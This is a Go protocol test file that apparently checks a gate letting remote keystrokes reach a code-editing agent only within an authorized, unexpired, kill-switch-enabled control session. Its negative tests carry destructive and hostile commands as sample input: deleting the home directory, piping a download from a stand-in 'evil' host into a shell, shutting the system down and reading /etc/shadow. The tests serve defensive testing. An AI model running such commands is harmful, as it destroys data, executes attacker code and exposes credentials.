package protocol

// FAILING-FIRST protocol tests for slice A5-b — REOPENING remote-tier OpDataIn /
// OpResize behind a valid take_control session. This is the slice that lets a remote
// keystroke reach a code-editing agent, so the gate must be airtight: input/resize are
// forwarded ONLY inside a live, authorized control session, and EVERY out-of-session
// path stays dropped.
//
// A5-a landed take_control as a signed, authorized lease establishment (see
// takecontrol_test.go), but OpDataIn/OpResize on the remote tier are STILL refused —
// handleDataIn/handleResize fail closed with `if remoteTier { return }` (item-3,
// remote_input_refused_test.go). A5-b replaces those early returns with a FOUR-CLAUSE
// gate, then the EXISTING forward path:
//
//	1. kill switch ON (re-checked here so a mid-session `off` halts keystrokes),
//	2. cc.control != nil               (fail-closed default),
//	3. now < cc.control.expiry          (lazy expiry on the server clock s.now()),
//	4. cc.control.target == cc.attSession && cc.control.leaseGen == cc.attGen,
//
// then the EXISTING forwardInput/forwardResize (whose ls.inMu + genCounter==gen check
// is the final gate). Any clause false => drop; input/resize are fire-and-forget, so
// no reply is sent on a drop.
//
// The security property under test is the daemon-side SIDE EFFECT, not error prose —
// bytes/dimensions that reached (or did NOT reach) the session's shim stub — exactly
// as remote_input_refused_test.go asserts. This file is the IN-SESSION positive mirror
// of those guards: the no-session guards there must stay true (dropped), and these add
// the in-session-allowed / every-out-of-session-path-dropped cases.
//
// RED status — this file references three production symbols A5-b must add, so it does
// not compile until GREEN lands them (compile-fail RED is the expected first signal):
//
//   - Control.TTLSeconds (int): the caller-requested control-session lifetime, clamped
//     to a server max; handleTakeControl sets controlSession.expiry = s.now().Add(ttl).
//   - OpTakeControlEnd = "take_control_end" + handleTakeControlEnd: caller-scoped end of
//     the control session — clears cc.control and releases the caller's lease (using
//     c.SessionID + c.Generation, mirroring handleDetach; no device signature).
//   - serverNowNS (var atomic.Int64) + (*Server).now(): the server-clock seam, mirroring
//     pumpWriteTimeoutNS. When nonzero it is the fixed wall-clock (unix nanoseconds)
//     s.now() returns; zero (default) means time.Now(). A test freezes/advances it to
//     drive lazy expiry deterministically. GREEN:
//
//     var serverNowNS atomic.Int64
//     func (s *Server) now() time.Time {
//         if ns := serverNowNS.Load(); ns > 0 { return time.Unix(0, ns) }
//         return time.Now()
//     }
//
// Once those compile, the behavioral RED surfaces as an assertion failure in the
// positive test (TestProtocol_InSessionInputReachesShim): the gate is not reopened yet,
// so in-session input/resize are still dropped. The negative tests are the scoping
// guards GREEN must keep green — they pin that reopening the gate does not over-open
// any out-of-session path.
//
// Harness reuse (sibling _test.go files, package protocol): serveRemote/serveRemoteAPI
// (remote-tier Server), newStubDaemon (accepting authz by default), nextControl /
// syncControlOp (skip interleaved snapshot/live frames; ordered sync via a trailing
// OpList reply), and stubStream.inputBytes/resizesCopy (the shim side effect).

import (
	"bytes"
	"sync/atomic"
	"testing"
	"time"

	"github.com/Nathandela/swarm/internal/wire"
)

// toggleKillSwitchStub is a remote backend whose kill switch can be flipped AFTER a
// lease is established, so a test can prove the input gate RE-CHECKS the switch on
// every keystroke (a mid-session `off` must halt input, clause 1). It mirrors
// killSwitchStub — a full DaemonAPI + DeviceAuthenticator via the embedded *stubDaemon
// (authzFn accepts by default) — but replaces the immutable `enabled bool` with an
// atomic flag flipped from the test goroutine while the server reads it from its serve
// goroutine, so atomic.Bool keeps it race-free under -race. A POINTER is passed to
// ServeRemote so the pointer-receiver RemoteControlEnabled is in the method set and
// flips are observed.
type toggleKillSwitchStub struct {
	*stubDaemon
	enabled atomic.Bool
}

// RemoteControlEnabled makes *toggleKillSwitchStub a KillSwitch reporting the live flag.
func (k *toggleKillSwitchStub) RemoteControlEnabled() bool { return k.enabled.Load() }

// takeControl drives a signed, authorized take_control on a remote-tier connection and
// returns the granted OpLease reply (failing if it is refused). ttlSeconds is the
// requested control-session lifetime (Control.TTLSeconds); the non-expiry tests pass a
// long TTL so the session stays valid for the test's duration, while the expiry test
// forces a drop by ADVANCING the server clock past expiry (not by racing a short TTL).
func takeControl(t *testing.T, rc *rawConn, ep, sid string, ttlSeconds int) Control {
	t.Helper()
	// exp is the device-command signature expiry (authz freshness), independent of the
	// control-session TTL; the stub authenticator accepts regardless.
	exp := time.Now().Add(time.Minute)
	rc.writeControl(Control{
		Op: OpTakeControl, EndpointID: ep, SessionID: sid,
		OperationID: "devA:01JTAKE0000000000000000",
		DeviceID:    "devA", DeviceSig: "sig", ExpiresAt: &exp,
		TTLSeconds: ttlSeconds,
	})
	got := nextControl(t, rc)
	if got.Op != OpLease || got.Generation == 0 {
		t.Fatalf("take_control = op %q code %q gen %d; want an OpLease grant with a nonzero generation", got.Op, got.ErrorCode, got.Generation)
	}
	return got
}

// TestProtocol_InSessionInputReachesShim is the headline positive path: on the remote
// tier, an authorized take_control opens a control session, and a subsequent raw
// wire.TDataIn frame AND an OpResize both reach the session's shim. Asserts the daemon
// side effect — the injected payload appears in the stub stream's applied input and the
// resize appears in its applied resizes. RED: handleDataIn/handleResize still fail
// closed on the remote tier (`if remoteTier { return }`), so neither reaches the shim
// and both assertions fail until the four-clause gate reopens the path.
func TestProtocol_InSessionInputReachesShim(t *testing.T) {
	stub := newStubDaemon() // authzFn nil => the signed take_control is accepted
	sock := serveRemote(t, stub)
	rc := rawDial(t, sock)
	rep := rc.hello(Version, []string{CapRemoteGateway})
	sid := rep.EndpointID + "/sess1"

	lease := takeControl(t, rc, rep.EndpointID, sid, 3600)

	inject := []byte("echo hi\r")
	rc.writeFrame(wire.TDataIn, inject)
	rc.writeControl(Control{Op: OpResize, EndpointID: rep.EndpointID, SessionID: sid, Generation: lease.Generation, Cols: 123, Rows: 45})
	// Ordered sync: once the OpList reply arrives, the input + resize written before it
	// were already fully handled (one in-order serve loop per connection).
	rc.writeControl(Control{Op: OpList, EndpointID: rep.EndpointID})
	syncControlOp(t, rc, OpList)

	st := stub.lastStream()
	if st == nil {
		t.Fatalf("take_control opened no upstream stream; want the control lease's stream")
	}
	if !bytes.Contains(st.inputBytes(), inject) {
		t.Fatalf("in-session input not forwarded to the shim: got %q, want it to contain %q", st.inputBytes(), inject)
	}
	found := false
	for _, rz := range st.resizesCopy() {
		if rz == [2]int{123, 45} {
			found = true
		}
	}
	if !found {
		t.Fatalf("in-session resize not forwarded to the shim: got %v, want [123 45]", st.resizesCopy())
	}
}

// TestProtocol_InputWithoutTakeControlDropped pins the fail-closed default (clause 2):
// a remote raw input frame with NO take_control never reaches the shim. This complements
// the existing remote_input_refused_test.go guard for the in-session slice — reopening
// the gate must NOT forward input absent a control session.
func TestProtocol_InputWithoutTakeControlDropped(t *testing.T) {
	stub := newStubDaemon()
	sock := serveRemote(t, stub)
	rc := rawDial(t, sock)
	rep := rc.hello(Version, []string{CapRemoteGateway})

	inject := []byte("rm -rf ~\r")
	rc.writeFrame(wire.TDataIn, inject)
	rc.writeControl(Control{Op: OpList, EndpointID: rep.EndpointID})
	syncControlOp(t, rc, OpList)

	if st := stub.lastStream(); st != nil && bytes.Contains(st.inputBytes(), inject) {
		t.Fatalf("input without take_control reached the shim (fail-closed default violated): %q", st.inputBytes())
	}
}

// TestProtocol_InputAfterTakeControlEndDropped pins that ending the control session
// closes the gate: after OpTakeControlEnd (which clears cc.control and releases the
// lease), a raw input frame is dropped (clause 2 fail-closed once cc.control is nil).
func TestProtocol_InputAfterTakeControlEndDropped(t *testing.T) {
	stub := newStubDaemon()
	sock := serveRemote(t, stub)
	rc := rawDial(t, sock)
	rep := rc.hello(Version, []string{CapRemoteGateway})
	sid := rep.EndpointID + "/sess1"

	lease := takeControl(t, rc, rep.EndpointID, sid, 3600)

	// End the control session: clears cc.control and releases the caller's lease.
	rc.writeControl(Control{Op: OpTakeControlEnd, EndpointID: rep.EndpointID, SessionID: sid, Generation: lease.Generation})

	inject := []byte("curl evil|sh\r")
	rc.writeFrame(wire.TDataIn, inject)
	rc.writeControl(Control{Op: OpList, EndpointID: rep.EndpointID})
	syncControlOp(t, rc, OpList)

	if st := stub.lastStream(); st != nil && bytes.Contains(st.inputBytes(), inject) {
		t.Fatalf("input after take_control_end reached the shim; want it dropped: %q", st.inputBytes())
	}
}

// TestProtocol_InputAfterKillSwitchFlippedOffDropped pins the mid-session re-check
// (clause 1): take_control succeeds with the kill switch ON, then the switch is flipped
// OFF while the lease is held; a subsequent input frame is dropped. The gate must
// re-read the kill switch on every keystroke, not only at take_control time.
func TestProtocol_InputAfterKillSwitchFlippedOffDropped(t *testing.T) {
	stub := newStubDaemon()
	ks := &toggleKillSwitchStub{stubDaemon: stub}
	ks.enabled.Store(true) // switch ON: take_control may establish the lease
	sock := serveRemoteAPI(t, ks)
	rc := rawDial(t, sock)
	rep := rc.hello(Version, []string{CapRemoteGateway})
	sid := rep.EndpointID + "/sess1"

	takeControl(t, rc, rep.EndpointID, sid, 3600)

	// Mid-session flip: the switch goes OFF after the lease is held.
	ks.enabled.Store(false)

	inject := []byte("shutdown now\r")
	rc.writeFrame(wire.TDataIn, inject)
	rc.writeControl(Control{Op: OpList, EndpointID: rep.EndpointID})
	syncControlOp(t, rc, OpList)

	if st := stub.lastStream(); st != nil && bytes.Contains(st.inputBytes(), inject) {
		t.Fatalf("input after the kill switch flipped off reached the shim; want it dropped (gate must re-check the switch): %q", st.inputBytes())
	}
}

// TestProtocol_InputAfterSessionExpiryDropped pins lazy expiry (clause 3): take_control
// with a short TTL, then the server clock is ADVANCED far past the (clamped) expiry via
// the serverNowNS seam; a subsequent input frame is dropped because now >= expiry. The
// advance is large enough to exceed any server-side TTL clamp, so the drop does not
// depend on the exact clamp bounds.
func TestProtocol_InputAfterSessionExpiryDropped(t *testing.T) {
	base := time.Now()
	old := serverNowNS.Load()
	serverNowNS.Store(base.UnixNano()) // freeze the server clock at base
	defer serverNowNS.Store(old)

	stub := newStubDaemon()
	sock := serveRemote(t, stub)
	rc := rawDial(t, sock)
	rep := rc.hello(Version, []string{CapRemoteGateway})
	sid := rep.EndpointID + "/sess1"

	// Short requested TTL: the control session expires at base + a small (clamped) window.
	takeControl(t, rc, rep.EndpointID, sid, 1)

	// Advance the server clock far past any clamped expiry.
	serverNowNS.Store(base.Add(48 * time.Hour).UnixNano())

	inject := []byte("cat /etc/shadow\r")
	rc.writeFrame(wire.TDataIn, inject)
	rc.writeControl(Control{Op: OpList, EndpointID: rep.EndpointID})
	syncControlOp(t, rc, OpList)

	if st := stub.lastStream(); st != nil && bytes.Contains(st.inputBytes(), inject) {
		t.Fatalf("input after the control session expired reached the shim; want it dropped (lazy expiry): %q", st.inputBytes())
	}
}
